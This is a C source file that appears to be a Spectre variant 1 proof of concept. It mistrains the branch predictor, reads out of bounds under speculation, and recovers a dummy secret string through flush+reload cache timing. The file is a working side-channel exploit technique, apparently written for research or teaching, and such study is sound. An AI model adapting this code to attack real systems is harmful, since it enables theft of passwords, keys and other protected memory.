#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include "gen_array.c"
#include "time_and_flush.c"

#define REPETITIONS 5

//last two pages will not be accessible.
//int accessible_pages = N_PAGES-2;
const int data_size = 35;
int accessible = 100;
volatile cp_t test2;
int secret_size = 25;
unsigned char* data_ptr = NULL;
__attribute__((noinline)) void victim_func(int index, cp_t* arr, unsigned char* data) {

        //flush bound value
    flush((void*)&accessible);
    volatile char c = data[index];
    __sync_synchronize();

    //access (possibly out of bounds)
    if (index < accessible) {
        unsigned char x = data[index];
        volatile cp_t cp = arr[x];
    }
}

int* spv1(int index) {
    unsigned char* data = "notasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretzhis is a secret message";
    data_ptr = data;

    //printf("trying index %d (%c)\n", index, data[index]);
    cp_t* arr = mmap_arr_cache_pages();
    flush_arr((void*)arr);

    //Misstrain branch predictor
    for(int i = 0; i < accessible - rand() % 10; i++) {
        victim_func(i, arr, data);
        __sync_synchronize();
        flush((void*)&arr[data[i]]);
    }

    //flush remnant data
    //flush_arr((void*)arr);
    //__sync_synchronize();

    //access out of bounds
    victim_func(index, arr, data);

    //time loading duration per array index
    int* results = reload(arr);
    unmap_cache_pages(arr);
    return results;
}

void print_results(int** results) {

    /*for(int s = 0; s < secret_size; s++) {
        printf("rep: %3d\t", s);
        for(int p = 0; p < N_PAGES; p++) {
            int t = results[s][p];
            if (t < CACHE_HIT)  printf("[%3d]\t", t);
            else                printf("%4d\t", t);
        }
        printf("\n");
    }*/

    for(int s = 0; s < secret_size; s++) {
        printf("char: %3d\t", s);
        for(int p = 0; p < N_PAGES; p++) {
            int t = results[s][p];
            if (t < CACHE_HIT)  printf("found: '%c'\twas: '%c'", p, data_ptr[accessible+s]);
        }
        printf("\n");
    }
}

int main(int argc, char* argv[]) {
    srand(time(NULL));
    int* results[secret_size];

    for(int r = 0; r < REPETITIONS; r++) {
        for (int i = 0; i < secret_size; i++) results[i] = malloc(N_PAGES * sizeof(int));


        for (int s = 0; s < secret_size; s++) {
            results[s] = spv1(accessible + s);
        }


        print_results(results);
    }
    for(int i = 0; i < secret_size; i++) free(results[i]);
}